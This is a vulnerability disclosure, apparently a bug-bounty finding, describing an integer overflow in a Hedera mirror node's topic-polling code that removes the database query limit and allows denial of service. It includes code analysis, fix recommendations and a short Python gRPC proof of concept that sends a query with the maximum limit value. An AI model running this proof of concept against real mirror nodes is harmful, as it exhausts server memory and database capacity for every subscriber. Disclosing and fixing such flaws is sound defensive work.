### Title
Integer Overflow in `poll()` Bypasses DB Query Limit, Enabling Unbounded Data Retrieval DoS

### Summary
In `PollingTopicMessageRetriever.poll()`, the expression `(int)(filter.getLimit() - context.getTotal().get())` silently overflows to `-1` when a user supplies `limit = Long.MAX_VALUE`. Because `TopicMessageFilter.hasLimit()` returns `false` for negative values, the downstream `findByFilter()` call omits `setMaxResults` entirely, causing every poll cycle to load all rows for the topic from the database with no bound. The outer `flux.take(Long.MAX_VALUE)` provides no relief, and the `isComplete()` check never fires, so polling repeats indefinitely.

### Finding Description

**Entry point — proto field is `uint64`, maps directly to Java `long`:**

`protobuf/src/main/proto/com/hedera/mirror/api/proto/consensus_service.proto` line 25: `uint64 limit = 4;`

`ConsensusController.toFilter()` at line 56 assigns it without any upper-bound check:
```java
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
``` [1](#0-0) 

The only guard is `@Min(0)` on `TopicMessageFilter.limit`, which `Long.MAX_VALUE` trivially satisfies. [2](#0-1) 

**Overflow site — `poll()` in `PollingTopicMessageRetriever`:**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, context.getMaxPageSize());
``` [3](#0-2) 

With `filter.getLimit() = Long.MAX_VALUE` and `context.getTotal().get() = 0`:
- `Long.MAX_VALUE - 0 = 0x7FFFFFFFFFFFFFFF`
- `(int) 0x7FFFFFFFFFFFFFFF = 0xFFFFFFFF = -1` (Java narrowing truncates to low 32 bits)
- `Math.min(-1, 1000) = -1`

**Limit bypass — `findByFilter()` in `TopicMessageRepositoryCustomImpl`:**

```java
if (filter.hasLimit()) {
    typedQuery.setMaxResults((int) filter.getLimit());
}
``` [4](#0-3) 

`hasLimit()` is `limit > 0`. With `limit = -1`, it returns `false`, so `setMaxResults` is never called and the JPA query returns every row matching the topic/time predicate. [5](#0-4) 

**Outer `take()` provides no relief:**

```java
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());
}
``` [6](#0-5) 

`filter.hasLimit()` is `true` (original limit is `Long.MAX_VALUE > 0`), so `flux.take(Long.MAX_VALUE)` is applied — which is semantically "take everything."

**`isComplete()` never terminates the loop:**

```java
boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
if (throttled) {
    return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
}
``` [7](#0-6) 

`total.get()` can never reach `Long.MAX_VALUE`. In throttled mode, if the DB returns more rows than `maxPageSize` (which it will, since there is no limit), `pageSize.get() >= maxPageSize` and `isComplete()` returns `false`, so polling repeats. On every subsequent poll, `(int)(Long.MAX_VALUE - N)` remains negative (the high bits of `Long.MAX_VALUE` are never cleared by subtracting a small `N`), so the overflow and the missing limit persist indefinitely.

### Impact Explanation

Each poll cycle issues an unbounded `SELECT` against the `topic_message` table for the targeted topic. For a high-volume topic this materialises the entire result set into the JVM heap (`getResultList().stream()`), repeated every `pollingFrequency` (default 2 s). A single malicious subscription can exhaust heap memory and saturate DB I/O, causing an effective denial of service for all subscribers. The `timeout` (default 60 s) provides a ceiling per subscription, but the attacker can simply reconnect immediately and repeat.

### Likelihood Explanation

No authentication or privilege is required — any gRPC client can set `limit` to `Long.MAX_VALUE` in a `ConsensusTopicQuery`. The protobuf field is `uint64`; `Long.MAX_VALUE` is a valid, encodable value. The exploit is deterministic, requires a single RPC call, and is trivially repeatable. Topics with large message histories (common on mainnet) amplify the impact.

### Recommendation

1. **Clamp `filter.limit` at the controller layer** before building the filter — reject or cap any value exceeding a configured maximum (e.g., `Integer.MAX_VALUE` or a smaller operational limit).
2. **Fix the cast in `poll()`** — use `Math.min` on the `long` values before casting:
   ```java
   long remaining = filter.getLimit() - context.getTotal().get();
   int limit = (int) Math.min(remaining, context.getMaxPageSize());
   ```
   This eliminates the overflow entirely and makes `pageSize` always non-negative.
3. **Add an upper-bound validator** on `TopicMessageFilter.limit` (e.g., `@Max(Integer.MAX_VALUE)`) so the constraint is enforced at the boundary, not buried in arithmetic.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    limit=(2**63 - 1),  # Long.MAX_VALUE — valid uint64, passes @Min(0)
)

# Each message received triggers a DB query with no LIMIT clause.
# On a topic with N messages, the server loads all N rows per poll cycle.
for response in stub.subscribeTopic(query):
    pass  # attacker can reconnect immediately after timeout
```

**Expected server-side behaviour:** `poll()` computes `(int)(Long.MAX_VALUE - 0) = -1`; `Math.min(-1, 1000) = -1`; `newFilter.limit = -1`; `hasLimit()` returns `false`; `setMaxResults` is not called; the DB returns all rows for the topic on every poll interval until the 60-second timeout, at which point the client reconnects and repeats.
